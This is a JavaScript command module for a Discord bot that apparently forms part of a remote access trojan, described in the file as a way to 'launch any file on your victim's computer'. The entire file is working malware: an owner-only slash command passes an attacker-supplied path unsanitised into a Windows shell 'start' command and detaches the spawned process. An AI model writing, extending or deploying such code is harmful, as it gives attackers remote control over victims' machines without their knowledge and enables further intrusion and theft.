const { ApplicationCommandOptionType } = require("discord.js"),
  { exec } = require("child_process");

module.exports = {
  name: "start",
  ownerOnly: true,
  description: "Launch any file on your victim's computer!",
  options: [
    {
      name: "path",
      description: "The path of the file",
      required: true,
      type: ApplicationCommandOptionType.String,
    },
  ],
  run: async (client, interaction, args) => {
    await interaction.reply({
      content: "Wait...",
      ephemeral: true,
    });
    // Récupérer le chemin depuis l'option ou utiliser une valeur par défaut
    const filePath = interaction.options.getString("path");

    // Exécuter le fichier avec spawn
    const childProcess = exec(`start "" "${filePath}"`);
    
    // Répondre à l'interaction avec un message indiquant que le fichier a été lancé
    await interaction.editReply({
      content: `File launched: ${filePath}`,
      ephemeral: true,
    });

    // Détacher le processus pour qu'il continue de s'exécuter même après la fin du bot
    childProcess.unref();
  },
};
